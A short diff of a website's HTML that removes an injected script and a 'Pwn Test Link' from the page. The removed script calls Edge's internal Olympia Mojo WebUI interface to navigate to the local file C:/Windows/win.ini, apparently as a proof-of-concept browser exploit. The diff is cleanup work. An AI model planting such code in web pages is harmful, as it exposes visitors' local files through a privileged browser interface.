@@ -39,17 +39,6 @@
       gtag('js', new Date());
 
       gtag('config', 'G-7919N8ZW6H');
-
-const m = await import('/edge_olympia.mojom-webui.js');
-console.log(Object.keys(m));
-
-const router = new m.EdgeOlympiaPageCallbackRouter();
-const handler = new m.EdgeOlympiaPageHandlerRemote();
-m.EdgeOlympiaPageHandlerFactory.getRemote().createEdgeOlympiaPageHandler(
-  router.$.bindNewPipeAndPassRemote(),
-  handler.$.bindNewPipeAndPassReceiver()
-);
-        handler.navigate("file:///C:/Windows/win.ini");
     </script>
 </head>
 
@@ -384,8 +373,6 @@ m.EdgeOlympiaPageHandlerFactory.getRemote().createEdgeOlympiaPageHandler(
                     </tbody>
                 </table>
                 <hr>
-
-                <a href="file:///C:/Windows/win.ini">Pwn Test Link</a>
 
                 <footer>
                     <p>&copy; OptikLab 2013-2022</p>
